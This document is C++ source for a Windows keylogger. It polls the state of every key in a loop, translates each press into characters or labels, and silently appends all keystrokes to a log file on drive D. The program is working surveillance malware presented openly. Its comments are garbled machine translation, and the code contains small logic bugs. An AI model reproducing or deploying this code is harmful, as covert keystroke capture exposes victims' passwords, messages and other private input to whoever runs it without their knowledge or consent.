#include <windows.h>
#include <Winuser.h>
#include <string>
#include <fstream>
#include <iostream>
using namespace std;

string GetKey(int Key) // determines what key keyboard press

{

  string KeyString = "";

  // symbol input

  const int KeyPressMask = 0x80000000; // keyboard mask constants

  int iShift = GetKeyState(0x10); // Shift key state Analyzing

  bool IS = (iShift & KeyPressMask) == KeyPressMask; // denotes the Shift key is pressed

  if (Key >= 186 && Key <= 222)

  {

    switch (Key)

    {

    case 186:

      if (IS)

        KeyString = ":";

      else

        KeyString = ";";

      break;

    case 187:

      if (IS)

        KeyString = "+";

      else

        KeyString = "=";

      break;

    case 188:

      if (IS)

        KeyString = "<";

      else

        KeyString = ",";

      break;

    case 189:

      if (IS)

        KeyString = "_";

      else

        KeyString = "-";

      break;

    case 190:

      if (IS)

        KeyString = ">";

      else

        KeyString = ".";

      break;

    case 191:

      if (IS)

        KeyString = "?";

      else

        KeyString = "/";

      break;

    case 192:

      if (IS)

        KeyString = "~";

      else

        KeyString = "`";

      break;

    case 219:

      if (IS)

        KeyString = "{";

      else

        KeyString = "[";

      break;

    case 220:

      if (IS)

        KeyString = "|";

      else

        KeyString = "\\";

      break;

    case 221:

      if (IS)

        KeyString = "}";

      else

        KeyString = "]";

      break;

    case 222:

      if (IS)

        KeyString = '"';

      else

        KeyString = "'";

      break;
    }
  }

  // Analyzing the first row of the keyboard

  if (Key == VK_ESCAPE) // Exit

    KeyString = "[Esc]";

  else if (Key == VK_F1) // F1 to F12

    KeyString = "[F1]";

  else if (Key == VK_F2)

    KeyString = "[F2]";

  else if (Key == VK_F3)

    KeyString = "[F3]";

  else if (Key == VK_F4)

    KeyString = "[F4]";

  else if (Key == VK_F5)

    KeyString = "[F5]";

  else if (Key == VK_F6)

    KeyString = "[F6]";

  else if (Key == VK_F7)

    KeyString = "[F7]";

  else if (Key == VK_F8)

    KeyString = "[F8]";

  else if (Key == VK_F9)

    KeyString = "[F9]";

  else if (Key == VK_F10)

    KeyString = "[F10]";

  else if (Key == VK_F11)

    KeyString = "[F11]";

  else if (Key == VK_F12)

    KeyString = "[F12]";

  else if (Key == VK_SNAPSHOT) // Print Screen

    KeyString = "[PrScrn]";

  else if (Key == VK_SCROLL) // Scroll Lock

    KeyString = "[Scroll Lock]";

  else if (Key == VK_PAUSE) // pause, interrupted

    KeyString = "[Pause]";

  else if (Key == VK_CAPITAL) // Caps Lock

    KeyString = "[Caps Lock]";

  //-------------------------------------//

  // Control key

  else if (Key == 8) // <- Backspace key

    KeyString = "[Backspace]";

  else if (Key == VK_RETURN) // Enter key, line feed

    KeyString = "[Enter]\n";

  else if (Key == VK_SPACE) // Space

    KeyString = " ";

  // shift key: when keyloggers can not record. Shift alone is not going to have any character,

  // shift key and the other key combinations, there is a character output when output

  /*

   else if (Key == VK_LSHIFT) // left shift key

  KeyString = "[Shift]";

   else if (Key == VK_LSHIFT) // right shift key

  KeyString = "[SHIFT]";

   If only for alphabetic keyboard input recording: You can not let the following key output to a file */

  else if (Key == VK_TAB) // tab key

    KeyString = "[Tab]";

  else if (Key == VK_LCONTROL) // left control key

    KeyString = "[Ctrl]";

  else if (Key == VK_RCONTROL) // Right control

    KeyString = "[CTRL]";

  else if (Key == VK_LMENU) // left shift key

    KeyString = "[Alt]";

  else if (Key == VK_LMENU) // Right shift key

    KeyString = "[ALT]";

  else if (Key == VK_LWIN) // Right WINDOWS key

    KeyString = "[Win]";

  else if (Key == VK_RWIN) // Right WINDOWS key

    KeyString = "[WIN]";

  else if (Key == VK_APPS) // Right on keyboard

    KeyString = "right";

  else if (Key == VK_INSERT) // Insert

    KeyString = "[Insert]";

  else if (Key == VK_DELETE) // Delete

    KeyString = "[Delete]";

  else if (Key == VK_HOME) // start

    KeyString = "[Home]";

  else if (Key == VK_END) // End

    KeyString = "[End]";

  else if (Key == VK_PRIOR) // Previous

    KeyString = "[PgUp]";

  else if (Key == VK_NEXT) // Next

    KeyString = "[PgDown]";

  // not commonly used in several key: no general keyboard

  else if (Key == VK_CANCEL) // Cancel

    KeyString = "[Cancel]";

  else if (Key == VK_CLEAR) // Clear

    KeyString = "[Clear]";

  else if (Key == VK_SELECT) // Select

    KeyString = "[Select]";

  else if (Key == VK_PRINT) // Print

    KeyString = "[Print]";

  else if (Key == VK_EXECUTE) // Execute

    KeyString = "[Execute]";

  //----------------------------------------//

  else if (Key == VK_LEFT) // up, down, left, right

    KeyString = "[←]";

  else if (Key == VK_RIGHT)

    KeyString = "[→]";

  else if (Key == VK_UP)

    KeyString = "[↑]";

  else if (Key == VK_DOWN)

    KeyString = "[↓]";

  else if (Key == VK_NUMLOCK) // keypad Num Lock

    KeyString = "[NumLock]";

  else if (Key == VK_ADD) // add, subtract, multiply, divide

    KeyString = "+";

  else if (Key == VK_SUBTRACT)

    KeyString = "-";

  else if (Key == VK_MULTIPLY)

    KeyString = "*";

  else if (Key == VK_DIVIDE)

    KeyString = "/";

  else if (Key == 190 || Key == 110) // small keyboard and a keyboard.

    KeyString = ".";

  // keypad number keys: 0-9

  else if (Key == VK_NUMPAD0)

    KeyString = "0";

  else if (Key == VK_NUMPAD1)

    KeyString = "1";

  else if (Key == VK_NUMPAD2)

    KeyString = "2";

  else if (Key == VK_NUMPAD3)

    KeyString = "3";

  else if (Key == VK_NUMPAD4)

    KeyString = "4";

  else if (Key == VK_NUMPAD5)

    KeyString = "5";

  else if (Key == VK_NUMPAD6)

    KeyString = "6";

  else if (Key == VK_NUMPAD7)

    KeyString = "7";

  else if (Key == VK_NUMPAD8)

    KeyString = "8";

  else if (Key == VK_NUMPAD9)

    KeyString = "9";

  //-------------------------------------------//

  //-------------------------------------------//

  // * to judge the case of letters * //

  else if (Key >= 97 && Key <= 122) // letters: a-z

  {

    if (GetKeyState(VK_CAPITAL)) // Caps Lock

    {

      if (IS) // Shift Press: lowercase

        KeyString = Key;

      else // Only Caps Lock: Output uppercase letters

        KeyString = Key - 32;
    }

    else // no caps lock

    {

      if (IS) // pressing the Shift key: uppercase letters

        KeyString = Key - 32;

      else // do not press the Shift key: lowercase letters

        KeyString = Key;
    }
  }

  else if (Key >= 48 && Key <= 57) // keypad numbers: 0-9 and symbols above

  {

    if (IS)

    {

      switch (Key)

      {

      case 48: // 0

        KeyString = ")";

        break;

      case 49: // 1

        KeyString = "!";

        break;

      case 50: // 2

        KeyString = "@";

        break;

      case 51: // 3

        KeyString = "#";

        break;

      case 52: // 4

        KeyString = "$";

        break;

      case 53: // 5

        KeyString = "%";

        break;

      case 54: // 6

        KeyString = "^";

        break;

      case 55: // 7

        KeyString = "&";

        break;

      case 56: // 8

        KeyString = "*";

        break;

      case 57: // 9

        KeyString = "(";

        break;
      }
    }

    else

      KeyString = Key;
  }

  if (Key != VK_LBUTTON || Key != VK_RBUTTON)

  {

    if (Key >= 65 && Key <= 90) // ASCII 65-90 to A-Z

    {

      if (GetKeyState(VK_CAPITAL)) // caps lock: Output A-Z

      {

        if (IS) // caps lock, shift key and press: output lowercase

          KeyString = Key + 32;

        else // Only Caps Lock: output to uppercase

          KeyString = Key;
      }

      else // No caps lock: a-z

      {

        if (IS)

        {

          KeyString = Key;
        }

        else

        {

          Key = Key + 32;

          KeyString = Key;
        }
      }
    }
  }

  return KeyString;
}

int main()

{

  string Filename = "D:\\log.txt"; // poured disc D records the presence log.txt text directory

  string TempString = "";

  fstream FStream;

  cout << "Keylogger Started Successfully.";

  FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);

  while (true)

  {

    Sleep(5);

    for (int i = 8; i <= 255; i++)

    {

      if (GetAsyncKeyState(i) & 1 == 1)

      {

        TempString = GetKey(i);

        FStream.write(TempString.c_str(), TempString.size());

        FStream.close();

        FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
      }
    }
  }
}
